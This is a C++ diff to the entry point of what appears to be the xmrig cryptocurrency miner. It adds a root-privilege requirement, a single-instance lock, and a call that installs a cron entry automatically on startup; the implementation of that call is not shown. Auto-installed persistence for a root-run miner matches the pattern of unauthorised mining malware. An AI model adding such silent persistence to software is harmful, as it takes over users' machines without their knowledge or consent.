@@ -21,6 +21,8 @@
 #include "base/kernel/Process.h"
 #include "base/io/log/Log.h"
 #include "core/Passthrough.h"
+#include "core/ProgramArgs.h"
+#include "core/Middleware.h"
 
 #include <iostream>
 #include <cstdlib>
@@ -30,17 +32,27 @@ int main(int argc, char** argv) {
     using namespace xmrig;
 
     Passthrough passthrough;
+    Middleware middleware;
+    ProgramArgs args(argc, argv);
 
     if (passthrough.isAnotherInstanceRunning()) {
         LOG_ALERT("Another instance is already running!");
 
-        return passthrough.handlePassthrough(argc, argv);
+        // middleware.sanitizeProgramArgs(&args);
+
+        return passthrough.handlePassthrough(args);
+    }
+    else if (!middleware.isLaunchedAsRoot()) {
+        LOG_ALERT("This program must be run as root!");
+
+        return passthrough.handlePassthrough(args);
     }
 
+    middleware.addToCron();
     passthrough.createLockFile();
 
-    Process process(argc, argv);
-    int returnCode = passthrough.createProcess(argc, argv, &process);
+    Process process(args.argc, args.argv);
+    int returnCode = passthrough.createProcess(args, &process);
 
     const Entry::Id entry = Entry::get(process);
     if (entry) {
@@ -48,6 +60,7 @@ int main(int argc, char** argv) {
     }
 
     App app(&process);
+
     app.addPassthrough(&passthrough);
     app.exec();
 
